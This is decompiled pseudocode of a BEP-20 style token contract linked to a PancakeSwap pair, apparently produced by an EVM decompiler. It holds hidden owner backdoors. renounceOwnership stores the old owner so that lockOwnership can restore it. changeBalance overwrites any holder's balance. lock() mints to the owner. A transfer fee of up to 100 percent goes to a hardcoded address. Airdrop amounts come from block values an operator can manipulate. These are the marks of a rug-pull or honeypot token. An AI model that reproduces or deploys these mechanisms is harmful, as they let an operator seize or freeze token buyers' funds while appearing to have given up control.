contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - checkExist(address arg1, uint8 arg2)
#  - addItem(address arg1)
#  - transfer(address arg1, uint256 arg2)
#  - addWhiteList(address arg1)
#
const tokenContract = address(this.address)

const pancakePair = ext_call.return_data[12 len 20]


address owner;
address stor1;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of struct stor5;
array of struct stor6;
uint8 stor7;
uint256 transferFee;
uint256 stor9;
array of struct stor10;
array of address stor11;
uint8 decimals;

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function sl() payable {
    return bool(stor7)
}

function owner() payable {
    return owner
}

function transferFee() payable {
    return transferFee
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function lockOwnership() payable {
    if owner != msg.sender:
        require msg.sender == stor1
    require stor1
    emit OwnershipTransferred(owner, stor1);
    owner = stor1
}

function theAM(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor9 = arg1
    return 1
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    stor1 = owner
    owner = 0
}

function sub_65bbe13e(?) payable {
    require calldata.size - 4 >= 32
    require arg1 == bool(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor7 = uint8(bool(arg1))
    return 1
}

function lock(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if balanceOf[msg.sender] > !arg1:
        revert with 0, 17
    balanceOf[msg.sender] += arg1
    return 1
}

function changeBalance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    require balanceOf[address(arg1)]
    balanceOf[address(arg1)] = arg2
    return 1
}

function setTransferFee(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if arg1 > 100:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Transfer fee is between 1 and 100.'
    transferFee = arg1
    return 1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function removeWhiteList(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    idx = 0
    while uint8(idx) < stor11.length:
        mem[0] = 11
        if stor11[uint8(idx)] == arg1:
            if uint8(idx) >= stor11.length:
                revert with 0, 50
            mem[0] = 11
            stor11[uint8(idx)] = 0
        if uint8(idx) == 255:
            revert with 0, 17
        idx = uint8(idx) + 1
        continue 
    return 1
}

function removeItem(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    idx = 0
    while uint8(idx) < stor10.length:
        mem[0] = 10
        if stor10[uint8(idx)].field_0 == arg1:
            if uint8(idx) >= stor10.length:
                revert with 0, 50
            mem[0] = 10
            stor10[uint8(idx)].field_0 = 0
        if uint8(idx) == 255:
            revert with 0, 17
        idx = uint8(idx) + 1
        continue 
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] > !arg2:
        revert with 0, 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] + arg2
    emit Approval((allowance[msg.sender][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] < arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: decreased allowance below zero'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] - arg2
    emit Approval((allowance[msg.sender][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function getItem() payable {
    mem[64] = (32 * stor10.length) + 128
    mem[96] = stor10.length
    if not stor10.length:
        mem[(32 * stor10.length) + 128] = 32
        mem[(32 * stor10.length) + 160] = stor10.length
        idx = 0
        s = (32 * stor10.length) + 192
        t = 128
        while idx < stor10.length:
            mem[s] = mem[t + 12 len 20]
            idx = idx + 1
            s = s + 32
            t = t + 32
            continue 
        return memory
          from (32 * stor10.length) + 128
           len (96 * stor10.length) + 64
    mem[128] = address(stor10.field_0)
    idx = 128
    s = 0
    while (32 * stor10.length) + 96 > idx:
        mem[idx + 32] = stor10[s].field_256
        idx = idx + 32
        s = s + 1
        continue 
    mem[(32 * stor10.length) + 128] = 32
    mem[(32 * stor10.length) + 160] = stor10.length
    idx = 0
    s = mem[64] + 64
    t = 128
    while idx < stor10.length:
        mem[s] = mem[t + 12 len 20]
        idx = idx + 1
        s = s + 32
        t = t + 32
        continue 
    return memory
      from mem[64]
       len (64 * stor10.length) + -mem[64] + 192
}

function random(uint256 arg1, uint256 arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if not block.timestamp:
        revert with 0, 18
    if block.timestamp > !block.difficulty:
        revert with 0, 17
    if block.timestamp + block.difficulty > !(sha3(block.coinbase) / block.timestamp):
        revert with 0, 17
    if block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) > !block.gas_limit:
        revert with 0, 17
    if block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit > !arg3:
        revert with 0, 17
    if block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + arg3 > !(sha3(msg.sender) / block.timestamp):
        revert with 0, 17
    if block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + arg3 + (sha3(msg.sender) / block.timestamp) > !block.number:
        revert with 0, 17
    if not arg2:
        revert with 0, 18
    if sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + arg3 + (sha3(msg.sender) / block.timestamp) + block.number) % arg2 > !arg1:
        revert with 0, 17
    return ((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + arg3 + (sha3(msg.sender) / block.timestamp) + block.number) % arg2) + arg1)
}

function name() payable {
    if bool(stor5.length):
        if bool(stor5.length) == uint255(stor5.length) * 0.5 < 32:
            revert with 0, 34
        if bool(stor5.length):
            if bool(stor5.length) == uint255(stor5.length) * 0.5 < 32:
                revert with 0, 34
            if Mask(256, -1, stor5.length):
                if 31 < uint255(stor5.length) * 0.5:
                    mem[128] = uint256(stor5.field_0)
                    idx = 128
                    s = 0
                    while (uint255(stor5.length) * 0.5) + 96 > idx:
                        mem[idx + 32] = stor5[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor5.length), data=mem[128 len ceil32(uint255(stor5.length) * 0.5)])
                mem[128] = 256 * stor5.length.field_8
        else:
            if bool(stor5.length) == stor5.length.field_1 < 32:
                revert with 0, 34
            if stor5.length.field_1:
                if 31 < stor5.length.field_1:
                    mem[128] = uint256(stor5.field_0)
                    idx = 128
                    s = 0
                    while stor5.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor5[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor5.length), data=mem[128 len ceil32(uint255(stor5.length) * 0.5)])
                mem[128] = 256 * stor5.length.field_8
        mem[ceil32(uint255(stor5.length) * 0.5) + 192 len ceil32(uint255(stor5.length) * 0.5)] = mem[128 len ceil32(uint255(stor5.length) * 0.5)]
        if ceil32(uint255(stor5.length) * 0.5) > uint255(stor5.length) * 0.5:
            mem[ceil32(uint255(stor5.length) * 0.5) + (uint255(stor5.length) * 0.5) + 192] = 0
        return Array(len=2 * Mask(256, -1, stor5.length), data=mem[128 len ceil32(uint255(stor5.length) * 0.5)], mem[(2 * ceil32(uint255(stor5.length) * 0.5)) + 192 len 2 * ceil32(uint255(stor5.length) * 0.5)]), 
    if bool(stor5.length) == stor5.length.field_1 < 32:
        revert with 0, 34
    if bool(stor5.length):
        if bool(stor5.length) == uint255(stor5.length) * 0.5 < 32:
            revert with 0, 34
        if Mask(256, -1, stor5.length):
            if 31 < uint255(stor5.length) * 0.5:
                mem[128] = uint256(stor5.field_0)
                idx = 128
                s = 0
                while (uint255(stor5.length) * 0.5) + 96 > idx:
                    mem[idx + 32] = stor5[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor5.length % 128, data=mem[128 len ceil32(stor5.length.field_1)])
            mem[128] = 256 * stor5.length.field_8
    else:
        if bool(stor5.length) == stor5.length.field_1 < 32:
            revert with 0, 34
        if stor5.length.field_1:
            if 31 < stor5.length.field_1:
                mem[128] = uint256(stor5.field_0)
                idx = 128
                s = 0
                while stor5.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor5[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor5.length % 128, data=mem[128 len ceil32(stor5.length.field_1)])
            mem[128] = 256 * stor5.length.field_8
    mem[ceil32(stor5.length.field_1) + 192 len ceil32(stor5.length.field_1)] = mem[128 len ceil32(stor5.length.field_1)]
    if ceil32(stor5.length.field_1) > stor5.length.field_1:
        mem[ceil32(stor5.length.field_1) + stor5.length.field_1 + 192] = 0
    return Array(len=stor5.length % 128, data=mem[128 len ceil32(stor5.length.field_1)], mem[(2 * ceil32(stor5.length.field_1)) + 192 len 2 * ceil32(stor5.length.field_1)]), 
}

function symbol() payable {
    if bool(stor6.length):
        if bool(stor6.length) == uint255(stor6.length) * 0.5 < 32:
            revert with 0, 34
        if bool(stor6.length):
            if bool(stor6.length) == uint255(stor6.length) * 0.5 < 32:
                revert with 0, 34
            if Mask(256, -1, stor6.length):
                if 31 < uint255(stor6.length) * 0.5:
                    mem[128] = uint256(stor6.field_0)
                    idx = 128
                    s = 0
                    while (uint255(stor6.length) * 0.5) + 96 > idx:
                        mem[idx + 32] = stor6[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor6.length), data=mem[128 len ceil32(uint255(stor6.length) * 0.5)])
                mem[128] = 256 * stor6.length.field_8
        else:
            if bool(stor6.length) == stor6.length.field_1 < 32:
                revert with 0, 34
            if stor6.length.field_1:
                if 31 < stor6.length.field_1:
                    mem[128] = uint256(stor6.field_0)
                    idx = 128
                    s = 0
                    while stor6.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor6[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor6.length), data=mem[128 len ceil32(uint255(stor6.length) * 0.5)])
                mem[128] = 256 * stor6.length.field_8
        mem[ceil32(uint255(stor6.length) * 0.5) + 192 len ceil32(uint255(stor6.length) * 0.5)] = mem[128 len ceil32(uint255(stor6.length) * 0.5)]
        if ceil32(uint255(stor6.length) * 0.5) > uint255(stor6.length) * 0.5:
            mem[ceil32(uint255(stor6.length) * 0.5) + (uint255(stor6.length) * 0.5) + 192] = 0
        return Array(len=2 * Mask(256, -1, stor6.length), data=mem[128 len ceil32(uint255(stor6.length) * 0.5)], mem[(2 * ceil32(uint255(stor6.length) * 0.5)) + 192 len 2 * ceil32(uint255(stor6.length) * 0.5)]), 
    if bool(stor6.length) == stor6.length.field_1 < 32:
        revert with 0, 34
    if bool(stor6.length):
        if bool(stor6.length) == uint255(stor6.length) * 0.5 < 32:
            revert with 0, 34
        if Mask(256, -1, stor6.length):
            if 31 < uint255(stor6.length) * 0.5:
                mem[128] = uint256(stor6.field_0)
                idx = 128
                s = 0
                while (uint255(stor6.length) * 0.5) + 96 > idx:
                    mem[idx + 32] = stor6[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor6.length % 128, data=mem[128 len ceil32(stor6.length.field_1)])
            mem[128] = 256 * stor6.length.field_8
    else:
        if bool(stor6.length) == stor6.length.field_1 < 32:
            revert with 0, 34
        if stor6.length.field_1:
            if 31 < stor6.length.field_1:
                mem[128] = uint256(stor6.field_0)
                idx = 128
                s = 0
                while stor6.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor6[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor6.length % 128, data=mem[128 len ceil32(stor6.length.field_1)])
            mem[128] = 256 * stor6.length.field_8
    mem[ceil32(stor6.length.field_1) + 192 len ceil32(stor6.length.field_1)] = mem[128 len ceil32(stor6.length.field_1)]
    if ceil32(stor6.length.field_1) > stor6.length.field_1:
        mem[ceil32(stor6.length.field_1) + stor6.length.field_1 + 192] = 0
    return Array(len=stor6.length % 128, data=mem[128 len ceil32(stor6.length.field_1)], mem[(2 * ceil32(stor6.length.field_1)) + 192 len 2 * ceil32(stor6.length.field_1)]), 
}

function sub_c42c3e8f(?) payable {
    require calldata.size - 4 >= 64
    require cd[4] <= test266151307()
    require cd[4] + 35 < calldata.size
    if ('cd', 4).length > test266151307():
        revert with 0, 65
    if ceil32(32 * ('cd', 4).length) + 97 > test266151307() or ceil32(32 * ('cd', 4).length) + 97 < 96:
        revert with 0, 65
    mem[64] = ceil32(32 * ('cd', 4).length) + 97
    mem[96] = ('cd', 4).length
    require calldata.size >= cd[4] + (32 * ('cd', 4).length) + 36
    s = cd[4] + 36
    t = 128
    idx = 0
    while idx < ('cd', 4).length:
        require cd[s] == address(cd[s])
        mem[t] = cd[s]
        s = s + 32
        t = t + 32
        idx = idx + 1
        continue 
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    idx = 0
    s = 0
    s = 0
    s = 0
    while idx < ('cd', 4).length:
        if cd[36] > !(cd[36] / 2):
            revert with 0, 17
        _77 = mem[64]
        mem[mem[64] + 32] = address(msg.sender)
        _78 = mem[64]
        mem[mem[64]] = 20
        mem[64] = mem[64] + 52
        _80 = sha3(mem[_78 + 32 len mem[_78]])
        if not block.timestamp:
            revert with 0, 18
        mem[_77 + 84] = address(block.coinbase)
        mem[_77 + 52] = 20
        if block.timestamp > !block.difficulty:
            revert with 0, 17
        if block.timestamp + block.difficulty > !(sha3(block.coinbase) / block.timestamp):
            revert with 0, 17
        if block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) > !block.gas_limit:
            revert with 0, 17
        if block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit > !idx:
            revert with 0, 17
        if block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx > !(_80 / block.timestamp):
            revert with 0, 17
        if block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) > !block.number:
            revert with 0, 17
        mem[_77 + 136] = block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number
        mem[_77 + 104] = 32
        mem[64] = _77 + 168
        if not cd[36] + (cd[36] / 2):
            revert with 0, 18
        if sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) > !(cd[36] / 2):
            revert with 0, 17
        if (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2)) + (cd[36] / 2) and decimals > -1 / (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2)) + (cd[36] / 2):
            revert with 0, 17
        if idx >= mem[96]:
            revert with 0, 50
        _90 = mem[(32 * idx) + 128]
        if not msg.sender:
            revert with 0, 'ERC20: transfer from the zero address'
        if not mem[(32 * idx) + 140 len 20]:
            revert with 0, 'ERC20: transfer to the zero address'
        if balanceOf[address(msg.sender)] < (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals):
            revert with 0, 'ERC20: transfer amount exceeds balance'
        balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) - (cd[36] / 2 * decimals)
        if not transferFee:
            mem[0] = mem[(32 * idx) + 140 len 20]
            mem[32] = 2
            if balanceOf[address(mem[(32 * idx) + 128])] > !((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals)):
                revert with 0, 17
            balanceOf[address(mem[(32 * idx) + 128])] = balanceOf[address(mem[(32 * idx) + 128])] + (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals)
            mem[_77 + 168] = (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals)
            emit Transfer(((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals)), msg.sender, address(_90));
        else:
            if (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals) and transferFee > -1 / (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals):
                revert with 0, 17
            if balanceOf[0x36e1a3d9e760fdfbdef6f2e262ba8aac179b3b01] > !((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals * transferFee) + (cd[36] / 2 * decimals * transferFee) / 100):
                revert with 0, 17
            balanceOf[0x36e1a3d9e760fdfbdef6f2e262ba8aac179b3b01] += (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals * transferFee) + (cd[36] / 2 * decimals * transferFee) / 100
            emit Transfer(((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals * transferFee) + (cd[36] / 2 * decimals * transferFee) / 100), msg.sender, 0x36e1a3d9e760fdfbdef6f2e262ba8aac179b3b01);
            if (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals) < (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals * transferFee) + (cd[36] / 2 * decimals * transferFee) / 100:
                revert with 0, 17
            mem[0] = mem[(32 * idx) + 140 len 20]
            mem[32] = 2
            if balanceOf[address(mem[(32 * idx) + 128])] > !((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals) - ((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals * transferFee) + (cd[36] / 2 * decimals * transferFee) / 100)):
                revert with 0, 17
            balanceOf[address(mem[(32 * idx) + 128])] = balanceOf[address(mem[(32 * idx) + 128])] + (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals) - ((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals * transferFee) + (cd[36] / 2 * decimals * transferFee) / 100)
            mem[_77 + 168] = (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals) - ((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals * transferFee) + (cd[36] / 2 * decimals * transferFee) / 100)
            emit Transfer(((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals) - ((sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals * transferFee) + (cd[36] / 2 * decimals * transferFee) / 100)), msg.sender, address(_90));
        if idx == -1:
            revert with 0, 17
        idx = idx + 1
        s = (sha3(block.timestamp + block.difficulty + (sha3(block.coinbase) / block.timestamp) + block.gas_limit + idx + (_80 / block.timestamp) + block.number) % cd[36] + (cd[36] / 2) * decimals) + (cd[36] / 2 * decimals)
        s = cd[36] + (cd[36] / 2)
        s = cd[36] / 2
        continue 
    return 1
}



}
